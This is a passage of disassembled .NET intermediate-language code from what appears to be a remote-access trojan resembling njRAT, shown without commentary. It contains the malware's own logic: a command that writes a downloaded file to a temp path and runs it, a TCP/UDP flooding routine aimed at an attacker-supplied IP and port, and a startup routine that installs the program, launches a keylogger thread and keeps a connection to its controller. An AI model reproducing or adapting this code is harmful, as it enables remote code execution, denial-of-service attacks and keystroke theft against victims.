        IL_0e81:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0e86:  callvirt   instance bool k.OK::Send(string)
        IL_0e8b:  pop
        IL_0e8c:  ldarg.0
        IL_0e8d:  ldstr      "bla"
        IL_0e92:  callvirt   instance bool k.OK::Send(string)
        IL_0e97:  pop
        IL_0e98:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0e9d:  leave      IL_1242

      }  // end handler
      IL_0ea2:  ldarg.0
      IL_0ea3:  ldstr      "bla"
      IL_0ea8:  callvirt   instance bool k.OK::Send(string)
      IL_0ead:  pop
      IL_0eae:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_0eb3:  ldstr      "."
      IL_0eb8:  ldloc.0
      IL_0eb9:  ldc.i4.1
      IL_0eba:  ldelem.ref
      IL_0ebb:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0ec0:  stloc.s    V_31
      .try
      {
        IL_0ec2:  ldloc.s    V_31
        IL_0ec4:  ldloc.1
        IL_0ec5:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0eca:  ldloc.s    V_31
        IL_0ecc:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_0ed1:  pop
        IL_0ed2:  ldarg.0
        IL_0ed3:  ldstr      "MSG"
        IL_0ed8:  ldarg.0
        IL_0ed9:  ldfld      string k.OK::Y
        IL_0ede:  ldstr      "Executed As "
        IL_0ee3:  ldloc.s    V_31
        IL_0ee5:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0eea:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0eef:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0ef4:  callvirt   instance bool k.OK::Send(string)
        IL_0ef9:  pop
        IL_0efa:  leave      IL_1242

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0eff:  dup
        IL_0f00:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0f05:  stloc.s    V_37
        IL_0f07:  ldarg.0
        IL_0f08:  ldstr      "MSG"
        IL_0f0d:  ldarg.0
        IL_0f0e:  ldfld      string k.OK::Y
        IL_0f13:  ldstr      "Execute ERROR "
        IL_0f18:  ldloc.s    V_37
        IL_0f1a:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0f1f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0f24:  callvirt   instance bool k.OK::Send(string)
        IL_0f29:  pop
        IL_0f2a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0f2f:  leave      IL_1242

      }  // end handler
      IL_0f34:  ldloc.s    V_55
      IL_0f36:  ldstr      "fld"
      IL_0f3b:  ldc.i4.0
      IL_0f3c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0f41:  ldc.i4.0
      IL_0f42:  bne.un     IL_11a5

      IL_0f47:  ldarg.0
      IL_0f48:  ldfld      bool k.OK::IsFlooding
      IL_0f4d:  brtrue     IL_11a5

      IL_0f52:  ldloc.0
      IL_0f53:  ldc.i4.1
      IL_0f54:  ldelem.ref
      IL_0f55:  stloc.s    V_40
      IL_0f57:  ldloc.0
      IL_0f58:  ldc.i4.2
      IL_0f59:  ldelem.ref
      IL_0f5a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0f5f:  stloc.s    V_42
      IL_0f61:  ldloc.0
      IL_0f62:  ldc.i4.3
      IL_0f63:  ldelem.ref
      IL_0f64:  stloc.s    V_43
      IL_0f66:  ldloc.0
      IL_0f67:  ldc.i4.4
      IL_0f68:  ldelem.ref
      IL_0f69:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0f6e:  stloc.s    V_45
      IL_0f70:  ldloc.0
      IL_0f71:  ldc.i4.5
      IL_0f72:  ldelem.ref
      IL_0f73:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0f78:  stloc.s    V_39
      IL_0f7a:  call       valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Now()
      IL_0f7f:  stloc.s    V_76
      IL_0f81:  ldloca.s   V_76
      IL_0f83:  ldloc.0
      IL_0f84:  ldc.i4.6
      IL_0f85:  ldelem.ref
      IL_0f86:  call       float64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToDouble(string)
      IL_0f8b:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::AddSeconds(float64)
      IL_0f90:  stloc.s    V_46
      IL_0f92:  ldloc.0
      IL_0f93:  ldc.i4.7
      IL_0f94:  ldelem.ref
      IL_0f95:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
      IL_0f9a:  stloc.s    V_44
      IL_0f9c:  ldloc.0
      IL_0f9d:  ldc.i4.8
      IL_0f9e:  ldelem.ref
      IL_0f9f:  stloc.s    V_38
      IL_0fa1:  ldc.i4.0
      IL_0fa2:  stloc.s    V_41
      IL_0fa4:  ldarg.0
      IL_0fa5:  ldc.i4.1
      IL_0fa6:  stfld      bool k.OK::IsFlooding
      .try
      {
        IL_0fab:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_ASCII()
        IL_0fb0:  ldloc.s    V_38
        IL_0fb2:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
        IL_0fb7:  stloc.s    V_47
        IL_0fb9:  ldloc.s    V_40
        IL_0fbb:  call       class [System]System.Net.IPAddress [System]System.Net.IPAddress::Parse(string)
        IL_0fc0:  ldloc.s    V_42
        IL_0fc2:  newobj     instance void [System]System.Net.IPEndPoint::.ctor(class [System]System.Net.IPAddress,
                                                                                int32)
        IL_0fc7:  stloc.s    V_48
        IL_0fc9:  br         IL_10eb

        IL_0fce:  ldloc.s    V_43
        IL_0fd0:  ldstr      "TCP"
        IL_0fd5:  ldc.i4.0
        IL_0fd6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                          string,
                                                                                                                          bool)
        IL_0fdb:  ldc.i4.0
        IL_0fdc:  bne.un.s   IL_1051

        IL_0fde:  ldc.i4.2
        IL_0fdf:  ldc.i4.1
        IL_0fe0:  ldc.i4.6
        IL_0fe1:  newobj     instance void [System]System.Net.Sockets.Socket::.ctor(valuetype [System]System.Net.Sockets.AddressFamily,
                                                                                    valuetype [System]System.Net.Sockets.SocketType,
                                                                                    valuetype [System]System.Net.Sockets.ProtocolType)
        IL_0fe6:  stloc.s    V_77
        IL_0fe8:  ldloc.s    V_77
        IL_0fea:  ldloc.s    V_44
        IL_0fec:  callvirt   instance void [System]System.Net.Sockets.Socket::set_Blocking(bool)
        IL_0ff1:  ldloc.s    V_77
        IL_0ff3:  stloc.s    V_49
        IL_0ff5:  ldloc.s    V_49
        IL_0ff7:  ldloc.s    V_48
        IL_0ff9:  callvirt   instance void [System]System.Net.Sockets.Socket::Connect(class [System]System.Net.EndPoint)
        .try
        {
          IL_0ffe:  br.s       IL_1032

          IL_1000:  ldloc.s    V_41
          IL_1002:  ldc.i4.1
          IL_1003:  add.ovf
          IL_1004:  stloc.s    V_41
          IL_1006:  ldloc.s    V_49
          IL_1008:  ldloc.s    V_47
          IL_100a:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[])
          IL_100f:  pop
          IL_1010:  ldloc.s    V_39
          IL_1012:  ldc.i4.0
          IL_1013:  ble.s      IL_101c

          IL_1015:  ldloc.s    V_39
          IL_1017:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
          IL_101c:  call       valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Now()
          IL_1021:  ldloc.s    V_46
          IL_1023:  call       int32 [mscorlib]System.DateTime::Compare(valuetype [mscorlib]System.DateTime,
                                                                        valuetype [mscorlib]System.DateTime)
          IL_1028:  ldc.i4.0
          IL_1029:  ble.s      IL_1032

          IL_102b:  ldarg.0
          IL_102c:  ldc.i4.0
          IL_102d:  stfld      bool k.OK::IsFlooding
          IL_1032:  ldarg.0
          IL_1033:  ldfld      bool k.OK::IsFlooding
          IL_1038:  brtrue.s   IL_1000

          IL_103a:  leave      IL_10eb

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_103f:  dup
          IL_1040:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_1045:  stloc.s    V_50
          IL_1047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_104c:  leave      IL_10eb

        }  // end handler
        IL_1051:  ldloc.s    V_43
        IL_1053:  ldstr      "UDP"
        IL_1058:  ldc.i4.0
        IL_1059:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                          string,
                                                                                                                          bool)
        IL_105e:  ldc.i4.0
        IL_105f:  bne.un.s   IL_10c9

        IL_1061:  ldc.i4.2
        IL_1062:  ldc.i4.2
        IL_1063:  ldc.i4.s   17
        IL_1065:  newobj     instance void [System]System.Net.Sockets.Socket::.ctor(valuetype [System]System.Net.Sockets.AddressFamily,
                                                                                    valuetype [System]System.Net.Sockets.SocketType,
                                                                                    valuetype [System]System.Net.Sockets.ProtocolType)
        IL_106a:  stloc.s    V_77
        IL_106c:  ldloc.s    V_77
        IL_106e:  ldloc.s    V_44
        IL_1070:  callvirt   instance void [System]System.Net.Sockets.Socket::set_Blocking(bool)
        IL_1075:  ldloc.s    V_77
        IL_1077:  stloc.s    V_51
        .try
        {
          IL_1079:  br.s       IL_10b0

          IL_107b:  ldloc.s    V_41
          IL_107d:  ldc.i4.1
          IL_107e:  add.ovf
          IL_107f:  stloc.s    V_41
          IL_1081:  ldloc.s    V_51
          IL_1083:  ldloc.s    V_47
          IL_1085:  ldc.i4.0
          IL_1086:  ldloc.s    V_48
          IL_1088:  callvirt   instance int32 [System]System.Net.Sockets.Socket::SendTo(uint8[],
                                                                                        valuetype [System]System.Net.Sockets.SocketFlags,
                                                                                        class [System]System.Net.EndPoint)
          IL_108d:  pop
          IL_108e:  ldloc.s    V_39
          IL_1090:  ldc.i4.0
          IL_1091:  ble.s      IL_109a

          IL_1093:  ldloc.s    V_39
          IL_1095:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
          IL_109a:  call       valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Now()
          IL_109f:  ldloc.s    V_46
          IL_10a1:  call       int32 [mscorlib]System.DateTime::Compare(valuetype [mscorlib]System.DateTime,
                                                                        valuetype [mscorlib]System.DateTime)
          IL_10a6:  ldc.i4.0
          IL_10a7:  ble.s      IL_10b0

          IL_10a9:  ldarg.0
          IL_10aa:  ldc.i4.0
          IL_10ab:  stfld      bool k.OK::IsFlooding
          IL_10b0:  ldarg.0
          IL_10b1:  ldfld      bool k.OK::IsFlooding
          IL_10b6:  brtrue.s   IL_107b

          IL_10b8:  leave.s    IL_10eb

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_10ba:  dup
          IL_10bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_10c0:  stloc.s    V_52
          IL_10c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_10c7:  leave.s    IL_10eb

        }  // end handler
        IL_10c9:  call       valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Now()
        IL_10ce:  ldloc.s    V_46
        IL_10d0:  call       int32 [mscorlib]System.DateTime::Compare(valuetype [mscorlib]System.DateTime,
                                                                      valuetype [mscorlib]System.DateTime)
        IL_10d5:  ldc.i4.0
        IL_10d6:  ble.s      IL_10df

        IL_10d8:  ldarg.0
        IL_10d9:  ldc.i4.0
        IL_10da:  stfld      bool k.OK::IsFlooding
        IL_10df:  ldloc.s    V_45
        IL_10e1:  ldc.i4.0
        IL_10e2:  ble.s      IL_10eb

        IL_10e4:  ldloc.s    V_45
        IL_10e6:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_10eb:  ldarg.0
        IL_10ec:  ldfld      bool k.OK::IsFlooding
        IL_10f1:  brtrue     IL_0fce

        IL_10f6:  ldarg.0
        IL_10f7:  ldc.i4.s   11
        IL_10f9:  newarr     [mscorlib]System.String
        IL_10fe:  stloc.s    V_60
        IL_1100:  ldloc.s    V_60
        IL_1102:  ldc.i4.0
        IL_1103:  ldstr      "MSG"
        IL_1108:  stelem.ref
        IL_1109:  ldloc.s    V_60
        IL_110b:  ldc.i4.1
        IL_110c:  ldarg.0
        IL_110d:  ldfld      string k.OK::Y
        IL_1112:  stelem.ref
        IL_1113:  ldloc.s    V_60
        IL_1115:  ldc.i4.2
        IL_1116:  ldstr      "Attacked "
        IL_111b:  stelem.ref
        IL_111c:  ldloc.s    V_60
        IL_111e:  ldc.i4.3
        IL_111f:  ldloc.s    V_40
        IL_1121:  stelem.ref
        IL_1122:  ldloc.s    V_60
        IL_1124:  ldc.i4.4
        IL_1125:  ldstr      ":"
        IL_112a:  stelem.ref
        IL_112b:  ldloc.s    V_60
        IL_112d:  ldc.i4.5
        IL_112e:  ldloc.s    V_42
        IL_1130:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_1135:  stelem.ref
        IL_1136:  ldloc.s    V_60
        IL_1138:  ldc.i4.6
        IL_1139:  ldstr      "   Requested "
        IL_113e:  stelem.ref
        IL_113f:  ldloc.s    V_60
        IL_1141:  ldc.i4.7
        IL_1142:  ldloc.s    V_41
        IL_1144:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_1149:  stelem.ref
        IL_114a:  ldloc.s    V_60
        IL_114c:  ldc.i4.8
        IL_114d:  ldstr      " ("
        IL_1152:  stelem.ref
        IL_1153:  ldloc.s    V_60
        IL_1155:  ldc.i4.s   9
        IL_1157:  ldloc.s    V_43
        IL_1159:  stelem.ref
        IL_115a:  ldloc.s    V_60
        IL_115c:  ldc.i4.s   10
        IL_115e:  ldstr      ")"
        IL_1163:  stelem.ref
        IL_1164:  ldloc.s    V_60
        IL_1166:  call       string [mscorlib]System.String::Concat(string[])
        IL_116b:  callvirt   instance bool k.OK::Send(string)
        IL_1170:  pop
        IL_1171:  leave.s    IL_11a5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1173:  dup
        IL_1174:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1179:  stloc.s    V_53
        IL_117b:  ldarg.0
        IL_117c:  ldstr      "MSG"
        IL_1181:  ldarg.0
        IL_1182:  ldfld      string k.OK::Y
        IL_1187:  ldstr      "Attacking ERROR "
        IL_118c:  ldloc.s    V_53
        IL_118e:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_1193:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1198:  callvirt   instance bool k.OK::Send(string)
        IL_119d:  pop
        IL_119e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_11a3:  leave.s    IL_11a5

      }  // end handler
      IL_11a5:  leave      IL_1242

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_11aa:  dup
      IL_11ab:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_11b0:  stloc.s    V_54
      .try
      {
        IL_11b2:  ldloc.0
        IL_11b3:  ldlen
        IL_11b4:  conv.ovf.i4
        IL_11b5:  ldc.i4.0
        IL_11b6:  ble.s      IL_11c9

        IL_11b8:  ldloc.0
        IL_11b9:  ldc.i4.0
        IL_11ba:  ldelem.ref
        IL_11bb:  ldstr      "Ex"
        IL_11c0:  ldc.i4.0
        IL_11c1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                          string,
                                                                                                                          bool)
        IL_11c6:  ldc.i4.0
        IL_11c7:  beq.s      IL_11cc

        IL_11c9:  ldc.i4.0
        IL_11ca:  br.s       IL_11cd

        IL_11cc:  ldc.i4.1
        IL_11cd:  ldloc.0
        IL_11ce:  ldc.i4.0
        IL_11cf:  ldelem.ref
        IL_11d0:  ldstr      "PLG"
        IL_11d5:  ldc.i4.0
        IL_11d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                          string,
                                                                                                                          bool)
        IL_11db:  ldc.i4.0
        IL_11dc:  ceq
        IL_11de:  or
        IL_11df:  brfalse.s  IL_11e8

        IL_11e1:  ldarg.0
        IL_11e2:  ldnull
        IL_11e3:  stfld      object k.OK::PLG
        IL_11e8:  ldarg.0
        IL_11e9:  ldc.i4.5
        IL_11ea:  newarr     [mscorlib]System.String
        IL_11ef:  stloc.s    V_60
        IL_11f1:  ldloc.s    V_60
        IL_11f3:  ldc.i4.0
        IL_11f4:  ldstr      "ER"
        IL_11f9:  stelem.ref
        IL_11fa:  ldloc.s    V_60
        IL_11fc:  ldc.i4.1
        IL_11fd:  ldarg.0
        IL_11fe:  ldfld      string k.OK::Y
        IL_1203:  stelem.ref
        IL_1204:  ldloc.s    V_60
        IL_1206:  ldc.i4.2
        IL_1207:  ldloc.0
        IL_1208:  ldc.i4.0
        IL_1209:  ldelem.ref
        IL_120a:  stelem.ref
        IL_120b:  ldloc.s    V_60
        IL_120d:  ldc.i4.3
        IL_120e:  ldarg.0
        IL_120f:  ldfld      string k.OK::Y
        IL_1214:  stelem.ref
        IL_1215:  ldloc.s    V_60
        IL_1217:  ldc.i4.4
        IL_1218:  ldloc.s    V_54
        IL_121a:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_121f:  stelem.ref
        IL_1220:  ldloc.s    V_60
        IL_1222:  call       string [mscorlib]System.String::Concat(string[])
        IL_1227:  callvirt   instance bool k.OK::Send(string)
        IL_122c:  pop
        IL_122d:  leave.s    IL_123b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_122f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1234:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1239:  leave.s    IL_123b

      }  // end handler
      IL_123b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_1240:  leave.s    IL_1242

    }  // end handler
    IL_1242:  ret
  } // end of method OK::Ind

  .method public instance class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo 
          GetEncoderInfo(string M) cil managed
  {
    // Code size       46 (0x2e)
    .maxstack  3
    .locals init (class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo[] V_0,
             class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo V_1,
             int32 V_2,
             int32 V_3)
    IL_0000:  call       class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo[] [System.Drawing]System.Drawing.Imaging.ImageCodecInfo::GetImageEncoders()
    IL_0005:  stloc.0
    IL_0006:  ldc.i4.0
    IL_0007:  ldloc.0
    IL_0008:  ldlen
    IL_0009:  conv.ovf.i4
    IL_000a:  stloc.3
    IL_000b:  stloc.2
    IL_000c:  br.s       IL_0028

    IL_000e:  ldloc.0
    IL_000f:  ldloc.2
    IL_0010:  ldelem.ref
    IL_0011:  callvirt   instance string [System.Drawing]System.Drawing.Imaging.ImageCodecInfo::get_MimeType()
    IL_0016:  ldarg.1
    IL_0017:  ldc.i4.0
    IL_0018:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001d:  ldc.i4.0
    IL_001e:  bne.un.s   IL_0024

    IL_0020:  ldloc.0
    IL_0021:  ldloc.2
    IL_0022:  ldelem.ref
    IL_0023:  ret

    IL_0024:  ldloc.2
    IL_0025:  ldc.i4.1
    IL_0026:  add.ovf
    IL_0027:  stloc.2
    IL_0028:  ldloc.2
    IL_0029:  ldloc.3
    IL_002a:  ble.s      IL_000e

    IL_002c:  ldnull
    IL_002d:  ret
  } // end of method OK::GetEncoderInfo

  .method public instance void  ko() cil managed noinlining nooptimization
  {
    // Code size       933 (0x3a5)
    .maxstack  5
    .locals init (int32 V_0,
             bool V_1,
             class [mscorlib]System.Threading.Thread V_2,
             string V_3,
             int32 V_4,
             class [mscorlib]System.Threading.Thread V_5,
             string V_6,
             int32 V_7,
             class [mscorlib]System.Threading.Thread V_8,
             string V_9,
             native int V_10)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool k.OK::Cnon
    IL_0006:  brfalse    IL_0339

    IL_000b:  ldarg.0
    IL_000c:  ldstr      "i"
    IL_0011:  ldstr      "!"
    IL_0016:  ldc.i4.1
    IL_0017:  callvirt   instance bool k.OK::STV(string,
                                                 object,
                                                 valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
    IL_001c:  pop
    IL_001d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0022:  brfalse.s  IL_005b

    .try
    {
      IL_0024:  ldarg.0
      IL_0025:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
      IL_002a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_002f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0034:  ldstr      "di"
      IL_0039:  ldstr      "!"
      IL_003e:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0043:  leave.s    IL_0051

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0045:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004f:  leave.s    IL_0051

    }  // end handler
    IL_0051:  ldc.i4     0x1388
    IL_0056:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_005b:  ldc.i4.0
    IL_005c:  stloc.1
    IL_005d:  ldarg.0
    IL_005e:  ldc.i4.1
    IL_005f:  ldarg.0
    IL_0060:  ldfld      string k.OK::RG
    IL_0065:  ldarg.0
    IL_0066:  ldfld      string k.OK::VN
    IL_006b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0070:  ldloca.s   V_1
    IL_0072:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_0077:  stfld      object k.OK::MT
    IL_007c:  ldloc.1
    IL_007d:  brtrue.s   IL_0093

    IL_007f:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
    IL_0084:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
    IL_0089:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
    IL_008e:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_0093:  ldarg.0
    IL_0094:  callvirt   instance void k.OK::INS()
    IL_0099:  ldarg.0
    IL_009a:  ldfld      bool k.OK::Idr
    IL_009f:  brtrue.s   IL_00c8

    IL_00a1:  ldarg.0
    IL_00a2:  ldarg.0
    IL_00a3:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
    IL_00a8:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_00ad:  stfld      string k.OK::EXE
    IL_00b2:  ldarg.0
    IL_00b3:  ldarg.0
    IL_00b4:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
    IL_00b9:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_00be:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_00c3:  stfld      string k.OK::DR
    IL_00c8:  ldarg.0
    IL_00c9:  dup
    IL_00ca:  ldvirtftn  instance void k.OK::RC()
    IL_00d0:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_00d5:  ldc.i4.1
    IL_00d6:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_00db:  stloc.s    V_5
    IL_00dd:  ldloc.s    V_5
    IL_00df:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_00e4:  ldarg.0
    IL_00e5:  newobj     instance void k.kl::.ctor()
    IL_00ea:  stfld      class k.kl k.OK::kq
    IL_00ef:  ldarg.0
    IL_00f0:  ldfld      class k.kl k.OK::kq
    IL_00f5:  ldarg.0
    IL_00f6:  ldfld      string k.OK::RG
    IL_00fb:  stfld      string k.kl::RG
    IL_0100:  ldarg.0
    IL_0101:  ldfld      class k.kl k.OK::kq
    IL_0106:  ldarg.0
    IL_0107:  ldfld      int32 k.OK::klen
    IL_010c:  stfld      int32 k.kl::Klen
    IL_0111:  ldarg.0
    IL_0112:  ldfld      class k.kl k.OK::kq
    IL_0117:  dup
    IL_0118:  ldvirtftn  instance void k.kl::WRK()
    IL_011e:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0123:  ldc.i4.1
    IL_0124:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0129:  stloc.2
    IL_012a:  ldloc.2
    IL_012b:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0130:  ldstr      ""
    IL_0135:  stloc.3
    IL_0136:  ldarg.0
    IL_0137:  ldfld      bool k.OK::BD
    IL_013c:  brfalse.s  IL_0165

    .try
    {
      IL_013e:  ldarg.0
      IL_013f:  dup
      IL_0140:  ldvirtftn  instance void k.OK::_Lambda$__1(object,
                                                           class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_0146:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_014b:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_0150:  ldarg.0
      IL_0151:  ldc.i4.1
      IL_0152:  callvirt   instance void k.OK::pr(int32)
      IL_0157:  leave.s    IL_0165

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0159:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_015e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0163:  leave.s    IL_0165

    }  // end handler
    IL_0165:  ldc.i4     0x3e8
    IL_016a:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_016f:  ldarg.0
    IL_0170:  ldfld      bool k.OK::Cn
    IL_0175:  brtrue.s   IL_017d

    IL_0177:  ldstr      ""
    IL_017c:  stloc.3
    IL_017d:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    IL_0182:  ldloc.0
    IL_0183:  ldc.i4.1
    IL_0184:  add.ovf
    IL_0185:  stloc.0
    IL_0186:  ldloc.s    V_4
    IL_0188:  ldc.i4.1
    IL_0189:  add.ovf
    IL_018a:  stloc.s    V_4
    .try
    {
      IL_018c:  ldloc.s    V_4
      IL_018e:  ldc.i4.5
      IL_018f:  bne.un.s   IL_01b6

      IL_0191:  ldc.i4.0
      IL_0192:  stloc.s    V_4
      .try
      {
        IL_0194:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_0199:  ldc.i4     0x400
        IL_019e:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_01a3:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_01a8:  leave.s    IL_01b6

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01b4:  leave.s    IL_01b6

      }  // end handler
      IL_01b6:  ldloc.0
      IL_01b7:  ldc.i4.8
      IL_01b8:  bne.un     IL_0326

      IL_01bd:  ldc.i4.0
      IL_01be:  stloc.0
      IL_01bf:  ldarg.0
      IL_01c0:  callvirt   instance string k.OK::ACT()
      IL_01c5:  stloc.s    V_6
